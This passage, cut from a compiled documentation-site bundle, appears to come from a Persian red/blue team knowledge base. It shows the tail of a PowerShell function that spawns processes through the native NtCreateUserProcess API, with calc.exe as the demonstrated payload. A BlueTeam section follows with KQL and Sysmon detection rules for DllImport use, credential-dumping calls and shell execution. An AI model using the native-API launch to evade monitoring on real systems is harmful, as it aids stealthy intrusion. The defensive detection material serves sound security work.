(Process & Thread)\n    $SecAttr = New-Object SECURITY_ATTRIBUTES\n    $SecAttr.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($SecAttr)\n\n    # CreateProcess --\x3e lpCurrentDirectory\n    $GetCurrentPath = (Get-Item -Path ".\\" -Verbose).FullName\n\n    # Call CreateProcess\n    [ntdll]::NtCreateUserProcess($Binary, $Args, [ref] $SecAttr, [ref] $SecAttr, $false, $CreationFlags, [IntPtr]::Zero, $GetCurrentPath, [ref] $StartupInfo, [ref] $ProcessInfo) |out-null\n\n}\n')),(0,a.kt)("p",null,"Execute Script"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},"Nooranet-CreateProcess -Binary C:\\Windows\\System32\\calc.exe -CreationFlags 0x0 -ShowWindow 0x1 -StartF 0x1\n")),(0,a.kt)("h3",{id:"blueteam-perspective-2"},"BlueTeam Perspective"),(0,a.kt)("fa",null,(0,a.kt)("div",{dir:"auto"},(0,a.kt)("h6",null,"\u0628\u0631\u0627\u06cc \u0634\u0646\u0627\u0633\u0627\u06cc\u06cc \u0627\u06cc\u0646 \u06af\u0648\u0646\u0647  \u062d\u0645\u0644\u0627\u062a \u0628\u0627\u06cc\u062f \u0628\u0627 Native Windows API \u0647\u0627 \u0622\u0634\u0646\u0627\u06cc\u06cc \u062f\u0627\u0634\u062a\u0647 \u0628\u0627\u0634\u0645 \u0648 \u0622\u0646 \u062f\u0633\u062a\u0647 \u0631\u0627 \u06a9\u0647 \u0642\u0627\u0628\u0644\u06cc\u062a \u0627\u062c\u0631\u0627\u06cc\u06cc \u062f\u0627\u0631\u0646 \u0628\u0635\u0648\u0631\u062a \u062e\u0627\u0635 \u0645\u0627\u0646\u06cc\u062a\u0648\u0631 \u06a9\u0646\u06cc\u0645 \u06a9\u0647 \u062f\u0631 \u0627\u062f\u0627\u0645\u0647 \u0645\u062b\u0627\u0644\u06cc \u0628\u0631\u0627\u06cc \u0627\u062c\u0631\u0627 \u06a9\u0631\u062f\u0646 \u067e\u0631\u0648\u0633\u0633 \u0647\u0627 \u0622\u0648\u0631\u062f\u0647 \u0634\u062f\u0647 \u0627\u0633\u062a"))),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(4830).Z,width:"505",height:"392"})),(0,a.kt)("h3",{id:"kql"},"KQL"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-aql"},'powershell.command.name : "Add-Type" and message : *DLLImport*\n')),(0,a.kt)("p",null,"Refrences ",(0,a.kt)("a",{parentName:"p",href:"https://captmeelo.com/redteam/maldev/2022/05/10/ntcreateuserprocess.html"},"https://captmeelo.com/redteam/maldev/2022/05/10/ntcreateuserprocess.html")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-bash"},'<Sysmon schemaversion="4.40">\n  <HashAlgorithms>*</HashAlgorithms>\n  <EventFiltering>\n    <RuleGroup name="" groupRelation="or">\n      <ProcessAccess onmatch="include">\n        <CallTrace condition="contains" name="function_name=ProviderExecMethod">C:\\Windows\\SYSTEM32\\framedynos.dll+2b496</CallTrace>\n        <CallTrace condition="contains" name="function_name=CWbemProviderGlueExecMethodAsync">C:\\Windows\\SYSTEM32\\framedynos.dll+2cb3e</CallTrace>\n        <CallTrace condition="contains any" name="function_name=WSHellExec">C:\\Windows\\System32\\wshom.ocx+c8a0;C:\\Windows\\System32\\wshom.ocx+c39d</CallTrace>\n        <CallTrace condition="contains" name="function_name=CSShellExecute_ExecuteAssoc">C:\\Windows\\System32\\SHELL32.dll+9b5bd</CallTrace>\n        <CallTrace condition="contains" name="function_name=CSShellExecute_DoExecute">C:\\Windows\\System32\\SHELL32.dll+ae3b9</CallTrace>\n        <Rule groupRelation="and" name="function_name=CreateProcessW">\n            <SourceImage condition="contains">C:\\Program Files\\Microsoft Office\\Root\\Office16</SourceImage>\n            <CallTrace condition="contains">C:\\Windows\\System32\\KERNELBASE.dll+76516</CallTrace>\n        </Rule>\n        <CallTrace condition="contains" name="function_name=MiniDumpWriteDump">C:\\Windows\\SYSTEM32\\dbgcore.DLL+6cfb</CallTrace>\n        <CallTrace condition="contains" name="function_name=PssCaptureSnapShot">C:\\Windows\\System32\\KernelBase.dll+de67e</CallTrace>\n      </ProcessAccess>\n    </RuleGroup>\n  </EventFiltering>\n</Sysmon>\n')))}u.isMDXComponent=!0},4830:(e,A,n)=>{n.d(A,{Z:()=>t});const t=n.p+"assets/images/process-flow-082240f25eb65e7c2eaed1c4adb45546.png"}}]);